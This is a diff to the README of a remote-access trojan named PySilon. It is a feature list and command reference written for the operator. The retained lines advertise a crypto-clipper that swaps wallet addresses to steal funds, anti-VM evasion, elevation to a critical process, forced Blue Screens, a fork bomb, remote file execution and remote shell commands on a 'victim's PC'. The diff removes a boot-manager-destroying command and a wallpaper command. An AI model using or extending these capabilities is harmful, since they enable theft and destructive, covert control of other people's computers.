@@ -59,7 +59,6 @@ Subscribe to our Telegram channels to always stay up-to-date with the most recen
 - elevate itself to *critical process* (will trigger *Blue Screen of Death* when killed)
 - directly *manipulate* **victim's PC graphics** (display custom "things"->[bitmaps, images, texts, glitch effects])
 - turn **off**/**on** *monitors* of victim's PC
-- completely **break Windows** (victim won't be able to start PC)
 - **block** access to any *website*
 - browse and kill running *processes*
 - disable processes (make certain processes **impossible** to run)
@@ -81,7 +80,6 @@ Subscribe to our Telegram channels to always stay up-to-date with the most recen
 - execute *files* on target PC
 - replace copied *crypto currency wallet* addresses to your [configured] ones
 - trigger *jumpscares*
-- change the *wallpaper* of *victim's Desktop*
 - trigger *Blue Screen of Death*
 - execute *fork bomb* (crash the PC)
 - *Anti-VM* (PySilon won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
@@ -108,7 +106,6 @@ Subscribe to our Telegram channels to always stay up-to-date with the most recen
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.display-graphic`</a> - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.display-glitch <name>`</a> - display specified screen glitch<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.monitors-off`</a> - turn off all monitors (`.monitors-on` to turn back on)<br />
-<a href="https://github.com/mategol/pysilon-malware#ss">                         `.break-windows`</a> - destroy Windows by overwriting the boot manager *(Dangerous)*<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.website-block <website>`</a> - block specified website from being accessed from any browser (`.website-unblock <website>` to unblock it)<br />
 <a href="https://github.com/mategol/pysilon-malware#show-what-to-show">          `.show <what-to-show>`</a> - get list of running processes or available commands<br />
 <a href="https://github.com/mategol/pysilon-malware#kill-process-id">            `.kill <process-name-or-id>`</a> - kill any running process<br />
@@ -133,7 +130,6 @@ Subscribe to our Telegram channels to always stay up-to-date with the most recen
 <a href="https://github.com/mategol/pysilon-malware#execute-file">               `.execute <file>`</a> - run any file on target PC<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones)(`.stop-clipper` to stop it)<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.jumpscare [<preset>]`</a> - play very loud and rapidly flashing video or other graphics<br />
-<a href="https://github.com/mategol/pysilon-malware#ss">                         `.wallpaper [<file>]`</a> - change the wallpaper of victim's Desktop (to existing one or sent in the next message if no filename was provided)<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.bsod`</a> - trigger Blue Screen of Death<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.forkbomb`</a> - execute fork bomb<br />
 <a href="https://github.com/mategol/pysilon-malware#ss">                         `.cmd <command>`</a> - execute shell command on victim's PC and send back the output<br />
